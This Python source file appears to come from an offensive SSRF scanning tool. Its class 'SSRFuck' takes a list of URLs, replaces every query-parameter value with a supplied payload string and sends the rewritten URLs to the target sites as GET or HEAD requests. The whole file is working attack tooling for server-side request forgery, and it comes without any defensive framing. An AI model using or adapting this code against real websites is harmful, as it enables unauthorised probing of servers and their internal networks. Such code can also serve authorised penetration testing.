from termcolor import colored
from random import randint
from urllib.parse import urlparse
from faster_than_requests import head, get
from concurrent.futures import ThreadPoolExecutor

from lib.ParamReplacer import ParamReplace
from lib.PathFunctions import PathFunction
from lib.Globals import ColorObj

class SSRFuck:
    def __init__(self):
        self.Replacer = ParamReplace()
        self.Function = PathFunction()

    def generate_payloads(self, URLs: list, replace_str: str) -> tuple:
        payloads_url = []
        for URL in URLs:   
            print(f"{ColorObj.information} Generating payload for: {colored(URL, color='cyan')}")
            half_payload = urlparse(URL)
            if not half_payload.query:
                continue
            else:
                param, value = self.Replacer.expand_parameter(half_payload.query)
                replacer_list = self.Replacer.replacement(param, value, replace_str)
                full_payload = self.Replacer.gen_url(self.Function.urler('') + half_payload.netloc + half_payload.path, replacer_list)
                payloads_url.append(full_payload)
        return payloads_url
 
    def try_payload(self, URL: str) -> bool:
        try:
            if randint(0,1) == 0:
                print(f"{ColorObj.good} Trying to get {colored(URL, color='cyan')}")
                get(URL, timeout=5000)
            elif randint(0,1) == 1:
                print(f"{ColorObj.good} Trying to head {colored(URL, color='cyan')}")
                head(URL, timeout=5000)
            else:
                print(f"{ColorObj.good} Trying to get {colored(URL, color='cyan')}")
                get(URL, timeout=5000)
        except Exception as E:
            print(E,E.__class__)
